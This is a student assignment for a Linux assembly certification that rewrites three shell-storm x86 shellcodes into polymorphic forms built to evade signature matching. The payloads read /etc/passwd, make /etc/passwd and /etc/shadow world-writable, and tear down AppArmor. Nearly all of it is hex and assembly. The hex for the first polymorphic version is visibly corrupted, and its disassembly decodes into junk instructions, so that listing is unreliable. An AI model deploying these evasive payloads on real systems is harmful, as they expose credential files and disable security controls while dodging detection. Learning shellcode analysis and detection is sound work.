# Assignment 6

## What to do
- Take up 3 shellcodes from shell-storm and create the polymorphic versions of them to beat pattern matching
- The polymorphic versions cannot be larger 50% of the existing shellcode
- Bonus points for making it shorter in length than original

Polymorphism can be achieved by replacing instruction by equivalent ones and by adding garbage instructions which do not change the functionality of the shellcode in any way.

##### > /bin/cat /etc/passwd

The first shellcode for which the polymorphic version we are going to create is:

> Linux/x86 - bin/cat /etc/passwd - 43 bytes by fb1h2s

and it is located in http://shell-storm.org/shellcode/files/shellcode-571.php

The Assembly of this shellcode:

```zsh
$ echo -ne "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80" | ndisasm -u -
00000000  31C0              xor eax,eax
00000002  99                cdq
00000003  52                push edx
00000004  682F636174        push dword 0x7461632f
00000009  682F62696E        push dword 0x6e69622f
0000000E  89E3              mov ebx,esp
00000010  52                push edx
00000011  6873737764        push dword 0x64777373
00000016  682F2F7061        push dword 0x61702f2f
0000001B  682F657463        push dword 0x6374652f
00000020  89E1              mov ecx,esp
00000022  B00B              mov al,0xb
00000024  52                push edx
00000025  51                push ecx
00000026  53                push ebx
00000027  89E1              mov ecx,esp
00000029  CD80              int 0x80
```

The polymorphic version of the shellcode is 62 bytes long. Below is the assembly code:
```zsh
echo -ne "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\xbe\x62\x62\x66\x53\x81\xc6\x11\x11\x11\x11\x89\x74\x24\xfc\xc7\x44\x24\xf8\x2f\x2f\x61\xc7\x44\x24\xf4\x2f\x65\x63\x83\xec\x0c\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80" | ndisasm -u -
00000000  31C0              xor eax,eax
00000002  99                cdq
00000003  52                push edx
00000004  682F636174        push dword 0x7461632f
00000009  682F62696E        push dword 0x6e69622f
0000000E  89E3              mov ebx,esp
00000010  52                push edx
00000011  BE62626653        mov esi,0x53666262
00000016  81C611111111      add esi,0x11111111
0000001C  897424FC          mov [esp-0x4],esi
00000020  C74424F82F2F61C7  mov dword [esp-0x8],0xc7612f2f
00000028  44                inc esp
00000029  24F4              and al,0xf4
0000002B  2F                das
0000002C  656383EC0C89E1    arpl [gs:ebx-0x1e76f314],ax
00000033  B00B              mov al,0xb
00000035  52                push edx
00000036  51                push ecx
00000037  53                push ebx
00000038  89E1              mov ecx,esp
0000003A  CD80              int 0x80
```

##### > chmod 666 /etc/passwd & /etc/shadow

The second shellcode for which the polymorphic version we are going to create is:

> Linux/x86 - chmod 666 /etc/passwd & /etc/shadow - 57 bytes by Jean Pascal Pereira

and it is located in http://shell-storm.org/shellcode/files/shellcode-812.php

The assembly of this shellcode is:
```zsh
$ echo -ne "\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80" | ndisasm -u -
00000000  31C0              xor eax,eax
00000002  66B9B601          mov cx,0x1b6
00000006  50                push eax
00000007  6873737764        push dword 0x64777373
0000000C  682F2F7061        push dword 0x61702f2f
00000011  682F657463        push dword 0x6374652f
00000016  89E3              mov ebx,esp
00000018  B00F              mov al,0xf
0000001A  CD80              int 0x80
0000001C  31C0              xor eax,eax
0000001E  50                push eax
0000001F  6861646F77        push dword 0x776f6461
00000024  682F2F7368        push dword 0x68732f2f
00000029  682F657463        push dword 0x6374652f
0000002E  89E3              mov ebx,esp
00000030  B00F              mov al,0xf
00000032  CD80              int 0x80
00000034  31C0              xor eax,eax
00000036  40                inc eax
00000037  CD80              int 0x80
```

The polymorphic version of the shellcode is 84 bytes long. Below is the assembly code:
```assembly
global _start

section .text
_start:

	mov esi, 0x6374652f
	jmp shellcode

	mov eax, 0xfffffff0
	not eax
	int 0x80
	xor eax, eax
	inc eax
	ret

shellcode:

	xor eax,eax
	mov cx,0x1b6
	push eax
	mov dword [esp-4], 0x64777373
	mov dword [esp-8], 0x61702f2f
	sub esp,8
	push esi
	mov ebx, esp

	call $-42
	dec eax
	push eax
	mov edx, 0x76f64617
	ror edx, 4
	push edx
	mov edx, 0xf68732f2
	rol edx, 4
	push edx

	push esi
	mov ebx, esp

	call $-70
	int 0x80
```

##### > /etc/init.d/apparmor teardown

The last shellcode for which the polymorphic version we are going to create is:

> Linux/x86 - /etc/init.d/apparmor teardown - 53 bytes by John Babio

and it is located in http://shell-storm.org/shellcode/files/shellcode-765.php

The assembly of this shellcode is:
```zsh
$ echo -ne "\x6a\x0b\x58\x31\xd2\x52\x68\x64\x6f\x77\x6e\x68\x74\x65\x61\x72\x89\xe1\x52\x68\x72\x6d\x6f\x72\x68\x61\x70\x70\x61\x68\x74\x2e\x64\x2f\x68\x2f\x69\x6e\x69\x68\x2f\x65\x74\x63\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" | ndisasm -u -
00000000  6A0B              push byte +0xb
00000002  58                pop eax
00000003  31D2              xor edx,edx
00000005  52                push edx
00000006  68646F776E        push dword 0x6e776f64
0000000B  6874656172        push dword 0x72616574
00000010  89E1              mov ecx,esp
00000012  52                push edx
00000013  68726D6F72        push dword 0x726f6d72
00000018  6861707061        push dword 0x61707061
0000001D  68742E642F        push dword 0x2f642e74
00000022  682F696E69        push dword 0x696e692f
00000027  682F657463        push dword 0x6374652f
0000002C  89E3              mov ebx,esp
0000002E  52                push edx
0000002F  51                push ecx
00000030  53                push ebx
00000031  89E1              mov ecx,esp
00000033  CD80              int 0x80
```

The polymorphic version of the shellcode is 80 bytes long. Below is the assembly code:

```assembly
global _start

section .text
_start:

	xor esi, esi
	push esi
	;push dword 0x6e776f64
	mov ecx, 0x11111111
	add ecx, 0x5d665e53
	push ecx

	;push dword 0x72616574
	add ecx, 0x03e9f610
	push ecx
	mov ecx, esp
	push esi
	;push dword 0x726f6d72
	mov dword [esp-4], 0x726f6d72
	;push dword 0x61707061
	mov dword [esp-8], 0x61707061
	;push dword 0x2f642e74
	mov dword [esp-12], 0x2f642e74
	;push dword 0x696e692f
	mov dword [esp-16], 0x696e692f
	;push dword 0x6374652f
	mov dword [esp-20], 0x6374652f
	sub esp, 20

	mov ebx,esp
	push esi
	push ecx
	push ebx
	mov ecx,esp

	push byte +0xb
	pop eax
	int 0x80
```

## Statement
This page has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student-ID: SLAE-998
